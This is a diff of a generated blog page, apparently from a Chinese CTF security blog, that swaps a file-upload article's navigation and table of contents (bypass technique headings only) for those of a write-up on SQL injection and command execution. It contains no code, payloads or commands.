-     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://blog.zyp0422.mom/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://blog.zyp0422.mom/qsnctf%E6%96%87%E7%AB%A0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -611,18 +552,18 @@
 
 <nav id="article-nav">
   
-    <a href="/sql%E6%B3%A8%E5%85%A5/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          SQL注入
+          命令执行
         
       </div>
     </a>
   
   
-    <a href="/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">文件包含</div>
+    <a href="/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">反序列化</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -649,7 +590,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%AA%8C%E8%AF%81"><span class="toc-number">1.</span> <span class="toc-text">本地客户端验证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.3.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A0%A1%E9%AA%8C"><span class="toc-number">2.</span> <span class="toc-text">服务器端校验</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#content-type%E5%AD%97%E6%AE%B5%E6%A0%A1%E9%AA%8C"><span class="toc-number">2.1.</span> <span class="toc-text">content-type字段校验</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">2.1.2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-1"><span class="toc-number">2.1.3.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E6%A0%A1%E9%AA%8C"><span class="toc-number">2.2.</span> <span class="toc-text">黑名单校验</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">2.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%80"><span class="toc-number">2.2.2.</span> <span class="toc-text">利用一</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%BA%8C"><span class="toc-number">2.2.3.</span> <span class="toc-text">利用二</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">2.2.3.1.</span> <span class="toc-text">例子</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%89"><span class="toc-number">2.2.4.</span> <span class="toc-text">利用三</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#00%E6%88%AA%E6%96%AD"><span class="toc-number">2.2.5.</span> <span class="toc-text">%00截断</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.6.</span> <span class="toc-text">双写绕过</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95%E6%A3%80%E9%AA%8C"><span class="toc-number">2.3.</span> <span class="toc-text">白名单检验</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%85%8D%E5%90%88apache%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7"><span class="toc-number">2.3.1.</span> <span class="toc-text">配合apache解析缺陷</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Magic-Header%E6%A3%80%E6%9F%A5"><span class="toc-number">2.3.2.</span> <span class="toc-text">Magic Header检查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AB%9E%E4%BA%89%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.3.3.</span> <span class="toc-text">竞争上传</span></a></li></ol></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%80%83%E7%82%B9%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">题目考点：SQL注入、命令执行</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -662,7 +603,7 @@
 
 
 
-<div id="SOHUCS" sid="文件上传" ></div> 
+<div id="SOHUCS" sid="qsnctf文章管理系统" ></div> 
 <script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
 <script type="text/javascript">
     window.changyan.api.config({
